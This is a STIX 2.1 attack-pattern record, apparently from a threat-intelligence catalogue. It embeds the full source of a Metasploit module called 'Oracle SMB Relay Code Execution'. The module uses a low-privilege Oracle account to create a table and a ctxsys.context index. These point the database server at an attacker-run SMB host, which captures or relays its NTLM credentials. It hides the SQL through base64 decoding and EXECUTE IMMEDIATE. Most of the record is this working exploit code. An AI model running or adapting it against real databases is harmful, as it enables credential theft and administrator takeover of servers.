{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7428411d-598c-46a3-9061-cd123c389ba1",
    "created": "2024-08-14T16:22:54.503594Z",
    "modified": "2024-08-14T16:22:54.503599Z",
    "name": "Oracle SMB Relay Code Execution",
    "description": " This module will help you to get Administrator access to OS using an unprivileged Oracle database user (you need only CONNECT and RESOURCE privileges). To do this you must firstly run smb_sniffer or smb_relay module on your sever. Then you must connect to Oracle database and run this module Ora_NTLM_stealer.rb which will connect to your SMB sever with credentials of Oracle RDBMS. So if smb_relay is working, you will get Administrator access to server which runs Oracle. If not than you can decrypt HALFLM hash. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/oracle/ora_ntlm_stealer.rb",
            "external_id": "ora_ntlm_stealer.rb"
        },
        {
            "source_name": "reference",
            "url": "http://dsecrg.com/pages/pub/show.php?id=17"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::ORACLE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle SMB Relay Code Execution',\n      'Description'    => %q{\n        This module will help you to get Administrator access to OS using an unprivileged\n        Oracle database user (you need only CONNECT and RESOURCE privileges).\n        To do this you must firstly run smb_sniffer or smb_relay module on your sever.\n        Then you must connect to Oracle database and run this module Ora_NTLM_stealer.rb\n        which will connect to your SMB sever with credentials of Oracle RDBMS.\n        So if smb_relay is working, you will get Administrator access to server which\n        runs Oracle. If not than you can decrypt HALFLM hash.\n      },\n      'Author'         => [ 'Sh2kerr <research[ad]dsecrg.com>' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://dsecrg.com/pages/pub/show.php?id=17' ],\n        ],\n      'DisclosureDate' => '2009-04-07'))\n\n      register_options(\n        [\n          OptString.new('IP', [ false, 'IP address of SMB proxy.', '0.0.0.0' ]),\n        ])\n  end\n\n  def run\n    return if not check_dependencies\n\n    name1 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n    name2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n    rand1 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n    rand2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n    rand3 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n\n    prepare  = \"CREATE TABLE #{name1} (id NUMBER PRIMARY KEY,path VARCHAR(255) UNIQUE,col_format VARCHAR(6))\"\n    prepare1 = \"INSERT INTO #{name1} VALUES (1, '\\\\\\\\#{datastore['IP']}\\\\SHARE', NULL)\"\n\n    exploiting1 = \"CREATE INDEX #{name2} ON #{name1}(path) INDEXTYPE IS ctxsys.context PARAMETERS ('datastore ctxsys.file_datastore format column col_format')\"\n\n    prp  = Rex::Text.encode_base64(prepare)\n    prp1 = Rex::Text.encode_base64(prepare1)\n    exp1 = Rex::Text.encode_base64(exploiting1)\n\n    sql = %Q|\n      DECLARE\n      #{rand1} VARCHAR2(32767);\n      #{rand2} VARCHAR2(32767);\n      #{rand3} VARCHAR2(32767);\n      BEGIN\n      #{rand1} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{prp}')));\n      EXECUTE IMMEDIATE #{rand1};\n      #{rand2} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{prp1}')));\n      EXECUTE IMMEDIATE #{rand2};\n      #{rand3} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{exp1}')));\n      EXECUTE IMMEDIATE #{rand3};\n      END;\n      |\n\n    begin\n      print_status(\"Executing #{self.name}...\")\n      prepare_exec(sql)\n    rescue => e\n      return\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-04-07"
}